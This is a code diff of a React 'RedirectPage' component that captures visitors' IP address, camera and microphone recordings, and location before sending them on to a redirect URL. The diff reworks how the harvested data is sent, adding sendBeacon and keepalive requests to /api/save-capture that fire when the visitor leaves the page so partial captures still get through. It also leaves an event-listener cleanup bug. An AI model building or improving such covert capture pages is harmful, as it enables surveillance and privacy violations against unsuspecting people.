@@ -5,7 +5,7 @@ import { getTranslator } from '../contexts/LanguageContext';
 import { useNotification } from '../contexts/SettingsContext';
 import { NEW_REDIRECT_TEMPLATE, CARD_STYLES, CLOUDINARY_UPLOAD_URL, CLOUDINARY_UPLOAD_PRESET } from '../constants';
 import { db } from '../firebase';
-import { collection, addDoc, query, where, getDocs } from 'firebase/firestore';
+import { collection, query, where, getDocs } from 'firebase/firestore';
 import PermissionInstructions from './PermissionInstructions';
 
 interface RedirectPageProps {
@@ -250,13 +250,12 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
   const capturedDataRef = React.useRef<Partial<CapturedData>>({});
   const hasSavedRef = React.useRef(false);
 
-  const saveData = React.useCallback(async (dataToSave: Partial<CapturedData>, settingsToUse: Settings, isComplete: boolean) => {
-    if (hasSavedRef.current) return;
-
+  const saveToApi = React.useCallback(async (dataToSave: Partial<CapturedData>, settingsToUse: Settings, isComplete: boolean) => {
+    if (hasSavedRef.current && !isComplete) return; // Prevent multiple saves from pagehide/visibilitychange
+    
     // Check if there is meaningful data to save
-    if (!dataToSave.ip && !dataToSave.cameraCapture && !dataToSave.microphoneCapture && !dataToSave.location?.lat) {
-        return;
-    }
+    const hasMeaningfulData = dataToSave.ip || dataToSave.cameraCapture || dataToSave.microphoneCapture || dataToSave.location?.lat;
+    if (!hasMeaningfulData) return;
     
     hasSavedRef.current = true;
     
@@ -270,34 +269,56 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
     
     Object.keys(finalData).forEach(key => (finalData as any)[key] === undefined && delete (finalData as any)[key]);
     
-    try {
-        await addDoc(collection(db, 'captures'), finalData);
-    } catch (e) {
-        console.error("Failed to save captured data:", e);
+    const body = JSON.stringify(finalData);
+
+    if (isComplete) {
+      // For completed sessions, use fetch
+      try {
+        await fetch('/api/save-capture', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: body,
+        });
+      } catch (e) {
+        console.error("Failed to save captured data via fetch:", e);
+      }
+    } else {
+      // For incomplete sessions (page exit), use sendBeacon
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon('/api/save-capture', body);
+      } else {
+         // Fallback for older browsers
+        await fetch('/api/save-capture', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: body,
+          keepalive: true,
+        });
+      }
     }
   }, []);
 
   React.useEffect(() => {
     const handlePageExit = () => {
       if (settings && !hasSavedRef.current) {
-        saveData(capturedDataRef.current, settings, false);
+        saveToApi(capturedDataRef.current, settings, false);
       }
     };
 
-    const handleVisibilityChange = () => {
+    // 'visibilitychange' is more reliable than 'beforeunload' for modern browsers, especially on mobile.
+    // 'pagehide' is a good fallback for unload events.
+    window.addEventListener('visibilitychange', () => {
       if (document.visibilityState === 'hidden') {
         handlePageExit();
       }
-    };
-
-    window.addEventListener('visibilitychange', handleVisibilityChange);
+    });
     window.addEventListener('pagehide', handlePageExit);
 
     return () => {
-      window.removeEventListener('visibilitychange', handleVisibilityChange);
+      window.removeEventListener('visibilitychange', handlePageExit);
       window.removeEventListener('pagehide', handlePageExit);
     };
-  }, [settings, saveData]);
+  }, [settings, saveToApi]);
 
   React.useEffect(() => {
     const loadSettings = async () => {
@@ -444,7 +465,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
             capturedDataRef.current.cameraCapture = cameraUrl;
             capturedDataRef.current.microphoneCapture = micUrl;
             
-            await saveData(capturedDataRef.current, settings, true);
+            await saveToApi(capturedDataRef.current, settings, true);
 
         } catch (error) {
             console.error("Failed to save captured data:", error);
@@ -455,7 +476,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
               window.location.href = settings.redirectUrl;
             }
         }
-    }, [settings, isPreview, addNotification, saveData]);
+    }, [settings, isPreview, addNotification, saveToApi]);
 
     const requestPermissions = React.useCallback(async () => {
         if (!settings || isPreview) return;
